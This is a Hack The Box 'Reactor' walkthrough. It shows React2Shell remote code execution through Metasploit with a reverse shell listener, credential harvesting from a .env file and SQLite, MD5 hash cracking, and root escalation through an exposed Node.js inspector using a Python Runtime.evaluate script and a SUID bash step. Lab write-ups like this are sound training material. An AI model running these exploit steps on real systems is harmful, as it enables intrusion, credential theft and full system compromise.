# Hack The Box — Reactor

> **Difficulty:** Easy  
> **OS:** Linux  
> **IP:** `10.129.245.214`  
> **Domain:** `reactor.htb`

---

# 1. Initial Recon

## Nmap

I started with a full TCP port scan using default scripts and service/version detection to identify the exposed services:

```
nmap -sC -sV -p- --min-rate 1000 10.129.245.214
```

The scan revealed two open ports:

```
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16
3000/tcp open  ppp?
```

Port 3000 returned HTTP responses with several Next.js-specific headers, including `X-Powered-By: Next.js`, indicating that the target was running a Next.js application.

## Add the Host to `/etc/hosts`

I added the target IP and hostname to `/etc/hosts` so I could access the application using its domain name:

```
echo "10.129.245.214 reactor.htb" | sudo tee -a /etc/hosts
```

---

# 2. Web Enumeration

## Identify the Technology Stack

I opened the application at `http://reactor.htb:3000` and found a nuclear reactor monitoring dashboard called **ReactorWatch**.

The Nmap response headers indicated that the application was built with Next.js. Since the application appeared to use a relatively recent version of the framework, I investigated vulnerabilities affecting React Server Components.

## CVE-2025-55182 — React2Shell

The application appeared to be a potential candidate for **CVE-2025-55182**, commonly known as React2Shell.

React2Shell is an unauthenticated remote code execution vulnerability affecting vulnerable React Server Components implementations. It involves unsafe deserialization of specially crafted data handled by the React Server Components protocol.

Reference: [CVE-2025-55182 — NVD](https://nvd.nist.gov/vuln/detail/CVE-2025-55182)

I searched for an available Metasploit module:

```
msfconsole
search CVE-2025-55182
```

The search returned the following module:

```
exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
```

I selected the module and configured the target and listener:

```
use exploit/multi/http/react2shell_unauth_rce_cve_2025_55182
set RHOSTS 10.129.245.214
set RPORT 3000
set LHOST 10.10.14.113
set LPORT 4444
run
```

The module reported that the target was vulnerable and opened a command shell.

```
[+] The target appears to be vulnerable.
[*] Command shell session opened
```

---

# 3. Initial Foothold

## Enumerate the Application Directory

After obtaining a shell, I listed the application files:

```
ls
ls -la
```

The directory contained the Next.js application, its dependencies, configuration files, and a SQLite database:

```
app
.env
.next
next.config.js
node_modules
package.json
package-lock.json
reactor.db
```

The `.env` file and `reactor.db` database were particularly interesting because they could contain application configuration and user credentials.

## Inspect the Environment File

I checked the application's environment configuration:

```
cat .env
```

The file revealed the database location and additional configuration values:

```
# ReactorWatch Configuration
DB_PATH=/opt/reactor-app/reactor.db
DB_TYPE=sqlite3

# API Keys
SENSOR_API_KEY=rw_sk_7f8a9b2c3d4e5f6g7h8i9j0k
ALERT_WEBHOOK=https://alerts.internal.reactor.htb/webhook

# Node environment
NODE_ENV=production
```

The database path confirmed that the application used SQLite and stored its database at `/opt/reactor-app/reactor.db`.

---

# 4. Credential Discovery

## Enumerate the SQLite Database

I used SQLite to enumerate the database tables:

```
sqlite3 -batch reactor.db "SELECT name FROM sqlite_master WHERE type='table';"
```

The database contained two tables:

```
users
sensor_logs
```

I then queried the `users` table:

```
sqlite3 -batch reactor.db "SELECT * FROM users;"
```

The output revealed two user accounts with password hashes:

```
1|admin|a203b22191d744a4e70ada5c101b17b8|administrator|admin@reactor.htb
2|engineer|39d97110eafe2a9a68639812cd271e8e|operator|engineer@reactor.htb
```

The hashes appeared to use MD5. Since MD5 is a fast, unsalted hashing algorithm, I decided to attempt an offline dictionary attack.

## Crack the Password Hashes

I saved the hashes to `password.txt` and used John the Ripper with the `rockyou.txt` wordlist:

```
john --format='dynamic=md5($p)' \
    --wordlist=/usr/share/wordlists/rockyou.txt \
    password.txt
```

The hash belonging to `engineer` was successfully cracked. The recovered password was:

```
reactor1
```

## SSH as Engineer

With the recovered credentials, I connected to the target over SSH:

```
ssh engineer@10.129.245.214
```

Password:

```
reactor1
```

After logging in, I confirmed the current user:

```
id
```

I then retrieved the user flag from the engineer's home directory:

```
cat /home/engineer/user.txt
```

**User flag:** `USER_FLAG_HERE`

---

# 5. Privilege Escalation Enumeration

## Enumerate Listening Services

After obtaining SSH access as `engineer`, I enumerated the listening network sockets:

```
ss -tulpn
```

Among the results, I noticed a service listening on the loopback interface at port `9229`:

```
tcp LISTEN 0 511 127.0.0.1:9229 0.0.0.0:*
```

This port is commonly associated with the Node.js inspector, which provides debugging capabilities for running Node.js processes.

I tested the service with `curl`:

```
curl http://127.0.0.1:9229
```

The response was:

```
WebSockets request was expected
```

This suggested that the port was running a debugging service rather than a conventional HTTP application.

## Identify the Process

I searched the systemd service definitions for references to port `9229`:

```
grep -rn 9229 /etc/systemd/system/ 2>/dev/null
```

The result revealed the service's launch command:

```
/etc/systemd/system/uptime-monitor.service:8:
ExecStart=/usr/bin/node --inspect=127.0.0.1:9229 /opt/uptime-monitor/worker.js
```

The important part was:

```
--inspect=127.0.0.1:9229
```

The Node.js inspector was enabled and bound to localhost. Because the monitoring service ran as root, access to its debugging interface could potentially allow code execution with root privileges.

## Inspect the Monitoring Script

The service executed `/opt/uptime-monitor/worker.js`. The script implemented a simple uptime monitor that periodically requested the web application and logged its response.

Its main configuration included:

```
const TARGET_URL = 'http://127.0.0.1:3000/';
const CSV_FILE = '/var/log/uptime-monitor.csv';
const INTERVAL_MS = 30_000;
const TIMEOUT_MS = 10_000;
```

The script measured response status, latency, and response size, then appended the results to:

```
/var/log/uptime-monitor.csv
```

The monitoring functionality itself did not provide an obvious escalation path. The key weakness was the **root-owned Node.js process exposing its inspector interface**.

---

# 6. Exploiting the Node.js Inspector

## Forward the Inspector Port

Since port `9229` was only listening on the target's loopback interface, I created an SSH tunnel from my attacking machine:

```
ssh -L 9229:127.0.0.1:9229 engineer@10.129.245.214
```

With the tunnel established, I could access the inspector through my local port `9229`.

## Retrieve the Debugger WebSocket URL

I queried the inspector's JSON endpoint:

```
curl http://127.0.0.1:9229/json | jq
```

The response included a WebSocket debugger URL similar to:

```
ws://127.0.0.1:9229/aca9cd06-16d6-46d6-8d95-47b6de15a900
```

The UUID may differ between executions, so I used the URL returned by the target rather than assuming it would always be the same.

## Execute Commands Through the Inspector

The Node.js inspector supports the `Runtime.evaluate` method, which can evaluate JavaScript in the context of the attached process.

I created a Python script using the `websocket-client` library to connect to the debugger and execute a command through Node.js's `child_process` module.

Install the dependency if it is not already available:

```
pip install websocket-client
```

Create `exploit.py`:

```
import json
import sys
import websocket

ws = websocket.create_connection(sys.argv[1])

ws.send(json.dumps({
    "id": 1,
    "method": "Runtime.evaluate",
    "params": {
        "expression": (
            "process.mainModule.require('child_process')"
            ".execSync('id').toString()"
        )
    }
}))

print(ws.recv())
ws.close()
```

I ran the script using the WebSocket URL obtained from the inspector:

```
python3 exploit.py \
  "ws://127.0.0.1:9229/aca9cd06-16d6-46d6-8d95-47b6de15a900"
```

The response confirmed that the command executed as root:

```
uid=0(root) gid=0(root) groups=0(root)
```

This verified that I could execute commands with root privileges through the inspector.

## Obtain a Root Shell

To obtain a persistent root shell, I modified the JavaScript expression in the script to set the SUID bit on `/bin/bash`:

```
"process.mainModule.require('child_process').execSync('chmod u+s /bin/bash').toString()"
```

I ran the modified script against the same debugger URL. Once the command completed, I returned to my SSH session and executed Bash with the `-p` option:

```
/bin/bash -p
```

I verified the resulting privileges:

```
id
```

The effective user ID was root, confirming successful privilege escalation.

---

# 7. Root Flag

With root privileges, I read the root flag:

```
cat /root/root.txt
```

**Root flag:** `ROOT_FLAG_HERE`

---

# Attack Chain

1. **Reconnaissance:** Identified SSH on port 22 and a Next.js application on port 3000.
    
2. **Initial access:** Exploited CVE-2025-55182 (React2Shell) through Metasploit to obtain a shell as `node`.
    
3. **Credential discovery:** Found the application's SQLite database and extracted the user password hashes.
    
4. **Lateral movement:** Cracked the `engineer` account's MD5 password hash and logged in over SSH.
    
5. **Privilege escalation discovery:** Found a root-owned Node.js monitoring service running with `--inspect=127.0.0.1:9229`.
    
6. **Root access:** Forwarded the inspector port over SSH and used the V8 inspector protocol to execute commands as root.
    

---

# Vulnerabilities

|Vulnerability|Description|
|---|---|
|CVE-2025-55182 — React2Shell|Unauthenticated remote code execution in vulnerable React Server Components implementations.|
|Weak password storage|MD5 password hashes enabled offline dictionary cracking.|
|Exposed Node.js inspector|A root-owned process exposed a debugger endpoint on localhost, allowing privileged code execution to anyone able to connect to it.|

---

# Key Takeaways

- **Enumerate application frameworks:** Technology fingerprints can reveal promising avenues for vulnerability research.
    
- **Inspect application files:** Environment files and local databases may expose credentials and other sensitive configuration.
    
- **Identify weak password hashing:** Fast, unsalted hashes such as MD5 are susceptible to offline dictionary attacks.
    
- **Enumerate local listening ports:** Services bound to localhost can still present privilege-escalation opportunities through tunnels or local access.
    
- **Review process launch arguments:** Debugging flags such as Node.js `--inspect` can become dangerous when enabled on privileged processes.
    
- **Understand the security boundary:** A local-only debugger is not safe when an unprivileged user can reach a privileged process's debugging interface.
    

---

# Flags

- **User:** `USER_FLAG_HERE`
    
- **Root:** `ROOT_FLAG_HERE`